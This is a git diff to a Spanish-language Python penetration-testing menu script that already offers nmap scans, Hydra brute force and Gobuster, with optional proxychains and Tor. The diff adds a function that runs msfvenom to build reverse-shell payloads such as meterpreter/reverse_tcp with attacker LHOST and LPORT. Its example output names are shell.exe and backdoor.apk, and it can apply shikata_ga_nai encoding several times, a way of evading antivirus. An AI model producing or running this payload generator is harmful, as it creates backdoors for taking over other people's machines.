@@ -166,7 +166,58 @@ def escaneo_nessus(target):
     print(f"Lanza el escaneo de Nessus manualmente para el objetivo: {target}")
     print("Puedes automatizar esto usando la API REST de Nessus o el CLI cuando lo configures.")
 
-def mostrar_ayuda():
+
+def generar_payload_msfvenom():
+    plataforma = input("Plataforma (windows, linux, android, osx, etc.): ").lower()
+    tipo_payload = input("Tipo de payload (ejemplo: meterpreter/reverse_tcp): ")
+    lhost = input("LHOST (IP atacante): ")
+    lport = input("LPORT (puerto atacante): ")
+    nombre = input("Nombre de archivo de salida (ejemplo: shell.exe, backdoor.apk): ")
+
+    formato = ""
+    if plataforma == "windows":
+        formato = "exe"
+    elif plataforma == "linux":
+        formato = "elf"
+    elif plataforma == "android":
+        formato = "apk"
+    elif plataforma in ["osx", "mac", "macos"]:
+        formato = "macho"
+    else:
+        formato = input("Formato de archivo (ejemplo: exe, elf, apk, macho): ")
+
+    usar_encoder = input("¿Quieres usar encoder? (s/n): ").lower() == "s"
+    encoder = ""
+    veces = ""
+    badchars = ""
+    if usar_encoder:
+        encoder = input("Nombre del encoder (ejemplo: x86/shikata_ga_nai): ")
+        veces = input("¿Cuántas veces aplicar el encoder? (ejemplo: 5): ")
+        if not veces.isdigit() or int(veces) < 1:
+            veces = "1"
+        badchars = input("Badchars (caracteres a evitar, ejemplo: '\\x00\\x0a\\x0d') [deja vacío si no]: ")
+
+    comando = [
+        "msfvenom",
+        "-p", f"{plataforma}/{tipo_payload}",
+        "LHOST=" + lhost,
+        "LPORT=" + lport,
+        "-f", formato,
+        "-o", nombre
+    ]
+    if usar_encoder:
+        comando += ["-e", encoder, "-i", veces]
+        if badchars:
+            comando += ["-b", badchars]
+
+    print(f"\nEjecutando: {' '.join(comando)}")
+    try:
+        subprocess.run(comando, check=True)
+        print(f"Payload generado: {nombre}")
+    except subprocess.CalledProcessError as e:
+        print(f"Error al generar el payload: {e}")
+
+def mostrar_ayuda(): 
     print("""
 Opciones de escaneo:
 1. Escaneo básico (puertos, --open, --min-rate)
@@ -187,8 +238,10 @@ Opciones de escaneo:
 16. Fuerza bruta con Hydra (FTP, SSH, MySQL)
 17. Escaneo de directorios y archivos con Gobuster
 18. Escaneo de vulnerabilidades con Nessus
-h. Mostrar esta ayuda
+19. Generar payloads con msfvenom (Windows, Linux, Android, Mac, etc.)
+h.  Mostrar ayuda ()
 """)
+                    
 if __name__ == "__main__":
     usar_proxychains = input("¿Quieres usar proxychains y Tor para el escaneo? (s/n): ").lower() == "s"
     objetivo = input("Introduce la IP, dominio o IPv6 objetivo: ")
@@ -197,7 +250,7 @@ if __name__ == "__main__":
         exit(1)
 
     mostrar_ayuda()
-    opcion = input("Elige una opción (1-17, h para ayuda): ")
+    opcion = input("Elige una opción (1-19, h para ayuda): ")
     extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
     if extra.lower() in ["si", "no"]:
         extra = ""
@@ -255,6 +308,11 @@ if __name__ == "__main__":
         if not threads.isdigit() or int(threads) < 1:
             threads = "10"
         escaneo_gobuster(objetivo, wordlist, ext, threads)
+    
+    elif opcion == "18":
+        escaneo_nessus(objetivo)
+    elif opcion == "19":
+        generar_payload_msfvenom()
     elif opcion.lower() == "h":
         mostrar_ayuda()
     else:
